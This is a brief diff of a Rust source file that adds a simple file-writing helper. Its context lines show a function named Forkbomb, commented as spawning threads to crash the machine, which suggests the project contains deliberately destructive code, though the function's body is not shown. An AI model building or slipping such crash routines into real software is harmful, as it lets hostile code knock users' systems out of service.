@@ -76,6 +76,10 @@ fn ReadFile(filename: String) -> Result<String, std::io::Error>  {
          fs::read_to_string(filename) 
         }
 
+// WriteFile is used to write data into a given file.
+fn WriteFile(filename: &str, data: &str) -> Result<(), std::io::Error> {
+        fs::write(filename, data)
+        }
 
 // Forkbomb spawns threads in order to crash the machine.
 fn Forkbomb() {
